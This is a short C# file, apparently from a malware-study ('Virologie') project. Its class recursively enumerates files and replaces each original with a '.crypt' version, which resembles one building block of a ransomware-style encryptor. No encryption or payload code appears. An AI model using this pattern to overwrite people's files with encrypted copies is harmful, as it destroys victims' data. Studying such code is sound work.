using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;

namespace Virologie
{
    class FileExplorer
    {
        public delegate void FileAction(string filename);

        public IEnumerable<string> EnumerateFiles(string startDir, string filter)
        {
            return Directory.GetFiles(startDir, filter, SearchOption.AllDirectories);
        }

        public void ReplaceFile(string name)
        {
            if (!File.Exists(name + ".crypt")) return;
            File.Delete(name);
            File.Move(name + ".crypt", name);
        }
    }
}
